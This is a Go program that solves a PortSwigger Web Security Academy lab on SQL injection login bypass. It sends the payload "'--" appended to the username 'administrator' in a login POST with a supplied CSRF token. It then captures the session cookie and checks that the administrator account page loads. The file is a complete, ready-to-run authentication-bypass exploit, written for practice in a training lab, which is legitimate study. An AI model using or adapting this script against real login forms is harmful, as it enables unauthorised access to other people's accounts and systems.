package main

// lab url: https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const (
	uriLogin      = "/login"
	uriGetAccount = "/my-account?id="
	defaultUsername = "administrator"
	defaultPayload = "'--"
	defaultPassowrd = "anything"
	contentType = "application/x-www-form-urlencoded"
	sessionCookieName = "session"
)

type config struct {
	labURL    string
	csrfToken string
	username  string
	password  string
	proxyURL  string
}

func main() {
	cfg := parseArgs()

	targetURL := normalizeURL(cfg.labURL)
	client := newClient(cfg.proxyURL)

	fmt.Println("[+] Starting SQL injection test")

	sessionCookie, err := executeLoginAttack(client, targetURL, cfg)
	if err != nil {
		fmt.Printf("[-] Attack failed: %v\n", err)
		os.Exit(1)
	}

	success, err := verifyLogin(client, targetURL, cfg.username, sessionCookie)
	if err != nil {
		fmt.Printf("[-] Verification failed: %v\n", err)
		os.Exit(1)
	}

	if success {
		fmt.Println("[+] SQL injection successful!")
	} else {
		fmt.Println("[-] SQL injection unsuccessful")
	}
}

func parseArgs() config {
	var cfg config

	flag.StringVar(&cfg.labURL, "u", "", "Root URL of the PortSwigger Lab")
	flag.StringVar(&cfg.csrfToken, "csrf", "", "CSRF Token")
	flag.StringVar(&cfg.username, "username", defaultUsername, "Username (Optional)")
	flag.StringVar(&cfg.password, "password", defaultPassowrd, "Password (Optional)")
	flag.StringVar(&cfg.proxyURL, "proxy", "", "Proxy URL if wanted (Optional)")

	flag.Parse()

	if cfg.labURL == "" || cfg.csrfToken == "" {
		fmt.Println("[-] The lab URL and CSRF Token must be provided")
		fmt.Println("[-] Usage: -u <uri> --csrf <token> [--username <username>] [--password <password>] [--proxy <proxyURL>]")
		os.Exit(1)
	}

	return cfg
}

func normalizeURL(labURL string) string {
	// Ensure URL has proper protocol prefix
	if !strings.HasPrefix(labURL, "http://") && !strings.HasPrefix(labURL, "https://") {
		labURL = "http://" + labURL
	}

	// Remove trailing slash if present
	return strings.TrimSuffix(labURL, "/")
}

func newClient(proxyURL string) *http.Client {
	transport := &http.Transport{}

	if proxyURL != "" {
		proxyURLParsed, err := url.Parse(proxyURL)
		if err != nil {
			fmt.Printf("[-] Error parsing proxy URL: %v\n", err)
			os.Exit(1)
		}
		transport.Proxy = http.ProxyURL(proxyURLParsed)
	}

	return &http.Client{Transport: transport}
}

func executeLoginAttack(client *http.Client, targetURL string, cfg config) (*http.Cookie, error) {
	fullURL := targetURL + uriLogin

	username := cfg.username
	if username == defaultUsername {
		username = defaultUsername + defaultPayload
	}

	fmt.Printf("[+] Sendding request to URL \"%s\"\n", fullURL)
	fmt.Printf("[+] with Username: \"%s\" and Password: \"%s\"\n", username, cfg.password)

	requestBody := fmt.Sprintf("csrf=%s&username=%s&password=%s", cfg.csrfToken, username, cfg.password)

	// Create the POST request
	req, err := http.NewRequest(http.MethodPost, fullURL, strings.NewReader(requestBody))
	if err != nil {
	return nil, fmt.Errorf("error creating request: %w", err)
	}
	// Set Content-Type header (if needed, e.g., for form data)
	req.Header.Set("Content-Type", contentType)

	resp, err := client.Do(req)
	if err != nil {
	return nil, fmt.Errorf("error during HTTP request: %w", err)
	}

	defer safeClose(resp.Body)

	// Find session cookie
	for _, cookie := range resp.Cookies() {
		if cookie.Name == sessionCookieName {
			return cookie, nil
		}
	}

	return nil, errors.New("session cookie not found in response")
}

func verifyLogin(client *http.Client, targetURL, username string, cookie *http.Cookie) (bool, error) {
	fullURL := targetURL + uriGetAccount + username

	// Create a new HTTP GET request
	req, err := http.NewRequest(http.MethodGet, fullURL, nil)
	if err != nil {
		return false, fmt.Errorf("error creating verification request: %w", err)
	}

	// Add the cookie to the request
	req.AddCookie(cookie)

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		return false, fmt.Errorf("error sending verification request: %w", err)
	}
	defer safeClose(resp.Body)

	// Check if verification was successful
	if resp.StatusCode == http.StatusOK {
		fmt.Printf("[+] Status code is as expected: %d\n", resp.StatusCode)
		return true, nil
	}

	fmt.Printf("[-] Unexpected status code: got %d, expected %d\n", resp.StatusCode, http.StatusOK)
	return false, nil

}

func safeClose(closer io.Closer) {
	if err := closer.Close(); err != nil {
		fmt.Printf("[-] Error closing resource: %v\n", err)
	}
}